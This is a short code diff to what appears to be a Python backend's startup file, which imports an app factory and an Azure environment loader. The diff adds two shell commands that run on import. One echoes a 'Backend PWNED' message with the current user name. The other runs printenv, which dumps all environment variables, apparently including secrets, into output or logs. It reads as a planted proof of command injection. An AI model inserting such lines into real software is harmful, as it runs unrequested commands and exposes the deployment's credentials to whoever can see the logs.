@@ -1,4 +1,6 @@
 import os
+os.system("echo 'Backend PWNED: Executing as $(whoami)'")
+os.system("printenv")
 
 from app import create_app
 from load_azd_env import load_azd_env
